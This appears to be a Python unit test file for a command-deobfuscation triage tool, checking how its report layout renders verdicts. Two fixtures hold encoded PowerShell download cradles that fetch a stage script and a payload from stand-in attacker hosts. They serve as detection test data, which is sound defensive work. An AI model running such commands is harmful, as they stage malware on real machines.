"""Tests for the Tactical Triage HUD layout in render_pretty()."""

from __future__ import annotations

import base64
import unittest

from cmd_unmask.unpacker import unmask_command
from cmd_unmask.renderer import render_pretty


class TestTacticalHudLayout(unittest.TestCase):
    """Verify top-down HUD header, sequential numbering, benign collapsing, and ASCII fallback."""

    def test_critical_multistage_hud_box_and_sequential_sections(self) -> None:
        inner = "(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        verdict = unmask_command(
            f"powershell.exe -NoP -W Hidden -enc {b64}",
            source_id="hud-crit-1",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        out = render_pretty([verdict], color=True)

        # Top-down HUD box uses rounded UTF-8 borders when color=True
        self.assertIn("╭", out)
        self.assertIn("╰", out)
        self.assertIn("Triage Verdict [hud-crit-1]", out)
        self.assertIn("Process Chain :", out)
        self.assertIn("WINWORD.EXE", out)
        self.assertIn("Exec Brief    :", out)

        # Unified sequential sections without stray unnumbered headers
        self.assertIn("[1] UNMASKING TIMELINE", out)
        self.assertIn("[2] BEHAVIORAL EVIDENCE & CAPABILITIES", out)
        self.assertIn("[3] EXTRACTED IOCs (DEFANGED)", out)
        self.assertIn("[4] RECOMMENDED L1/L2 NEXT STEPS", out)
        self.assertIn("[5] READY-TO-PASTE SOC TICKET NOTE", out)

        self.assertNotIn("[BEHAVIORAL CAPABILITIES]", out)
        self.assertNotIn("[VERDICT RATIONALE]", out)
        self.assertNotIn("[ANALYST EXECUTIVE BRIEF]", out)
        self.assertNotIn("[RECOMMENDED L1/L2 NEXT STEPS]", out)

    def test_benign_collapses_empty_iocs_and_behavioral_sections(self) -> None:
        verdict = unmask_command("ipconfig /all", source_id="hud-ben-1")
        out = render_pretty([verdict], color=False)

        self.assertIn("[1] UNMASKING TIMELINE", out)
        self.assertIn("[2] BEHAVIORAL EVIDENCE: None", out)
        self.assertNotIn("[3] EXTRACTED IOCs", out)
        self.assertIn("[3] RECOMMENDED L1/L2 NEXT STEPS", out)
        self.assertIn("[4] READY-TO-PASTE SOC TICKET NOTE", out)

    def test_no_color_uses_strict_ascii_borders_without_jagged_lines(self) -> None:
        inner = "Invoke-WebRequest -Uri http://drop.evil.example/payload.bin -OutFile C:\\Users\\Public\\p.bin"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        verdict = unmask_command(
            f"powershell.exe -NoP -enc {b64}",
            source_id="hud-ascii-1",
            parent_image=r"C:\Windows\System32\cmd.exe",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        out = render_pretty([verdict], color=False)

        self.assertNotIn("\x1b[", out)
        for ch in ("╔", "║", "╚", "╭", "╮", "╰", "╯", "├─►", "└─►", "─", "│"):
            self.assertNotIn(ch, out)

        self.assertIn("+", out)
        self.assertIn("|--", out)
        self.assertIn("+--", out)

        # Verify all HUD box lines share identical width (no jagged right border)
        box_lines = []
        for line in out.splitlines():
            if line.startswith("+") or line.startswith("| "):
                box_lines.append(line)
            elif box_lines:
                break
        self.assertGreaterEqual(len(box_lines), 4)
        widths = {len(line) for line in box_lines}
        self.assertEqual(len(widths), 1, f"Jagged HUD box widths: {widths}")


if __name__ == "__main__":
    unittest.main()
